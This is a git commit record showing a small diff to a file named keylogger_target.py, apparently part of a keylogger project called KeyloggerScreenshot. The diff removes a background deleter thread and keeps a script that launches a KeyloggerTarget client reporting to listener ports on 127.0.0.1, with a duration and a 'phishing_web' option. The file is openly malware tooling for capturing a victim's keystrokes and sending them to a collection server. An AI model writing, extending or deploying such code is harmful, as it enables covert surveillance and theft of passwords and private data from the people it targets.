6cb29ba53cade4bbc55ed42862cef27e2cba619b
Fawaz <106278241+Kill0geR@users.noreply.github.com>
2023-07-10 23:06:14 +0200

    Update keylogger_target.py

--- keylogger_target.py
+++ keylogger_target.py
@@ -1,8 +1,4 @@
 import KeyloggerScreenshot as ks 
-import threading
-
-thread_deleter = threading.Thread(target=ks.Local_Deleter.DeleteList.start)
-thread_deleter.start()
 
 ip = '127.0.0.1'
 key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333, ip, 4444, duration_in_seconds=60, phishing_web=None)
